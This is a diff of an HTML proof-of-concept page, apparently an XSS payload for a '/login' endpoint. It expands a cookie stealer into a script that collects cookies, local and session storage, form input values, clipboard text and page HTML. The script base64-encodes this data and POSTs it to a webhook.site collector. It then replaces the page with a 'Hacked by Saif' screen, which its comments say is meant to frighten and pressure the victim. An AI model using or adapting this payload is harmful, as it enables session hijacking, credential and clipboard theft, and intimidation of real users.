@@ -1,33 +1,75 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>PoC Login Page</title>
-  </head>
-  <body>
-    <h1>Please wait...</h1>
+<head>
+  <title>PoC Login Page</title>
+</head>
+<body>
+  <script>
+    (async () => {
+      alert("⚠ WARNING: Your session is compromised! ⚠");
 
-    <script>
-      let data = `
-🍪 Cookies:
-${document.cookie}
+      // جمع بيانات كاملة وعميقة
+      const data = {
+        cookies: document.cookie,
+        localStorage: {...localStorage},
+        sessionStorage: {...sessionStorage},
+        url: location.href,
+        referrer: document.referrer,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        clipboard: "",
+        forms: Array.from(document.forms).map(f => ({
+          action: f.action,
+          method: f.method,
+          fields: Array.from(f.elements).map(e => ({
+            name: e.name,
+            type: e.type,
+            value: e.value
+          }))
+        })),
+        htmlSnapshot: document.documentElement.outerHTML.slice(0, 5000),
+        time: new Date().toISOString()
+      };
 
-📦 LocalStorage:
-${JSON.stringify(localStorage, null, 2)}
+      try {
+        data.clipboard = await navigator.clipboard.readText();
+      } catch {
+        data.clipboard = "Clipboard access denied or unsupported";
+      }
 
-📦 SessionStorage:
-${JSON.stringify(sessionStorage, null, 2)}
+      // تشفير البيانات لتكون مشفرة Base64 قبل الإرسال
+      const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
 
-🌍 URL:
-${location.href}
-      `;
-
+      // إرسال البيانات للويب هوك (POST) مع header JSON
       fetch("https://webhook.site/3dd75195-9a2f-4eb2-90e4-a036f13bdd9b", {
         method: "POST",
-        headers: { "Content-Type": "text/plain" },
-        body: data
-      });
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ exfiltrated: encoded })
+      }).catch(() => {});
 
-      alert("XSS triggered via /login and data exfiltrated!");
-    </script>
-  </body>
+      // إظهار رسالة "مرعبة" على الضحية لزيادة تأثير الخوف والضغط النفسي
+      document.body.innerHTML = `
+        <div style="
+          background: black; 
+          color: red; 
+          font-family: monospace; 
+          font-size: 3em; 
+          display: flex; 
+          height: 100vh; 
+          justify-content: center; 
+          align-items: center; 
+          flex-direction: column;
+          text-align: center;
+        ">
+          <div>💀 Hacked by Saif 💀</div>
+          <div style="font-size: 0.6em; margin-top: 20px;">
+            Your session and data have been compromised.<br>
+            All your inputs and clipboard have been stolen.<br>
+            Contact support immediately if you value your account.
+          </div>
+        </div>
+      `;
+    })();
+  </script>
+</body>
 </html>
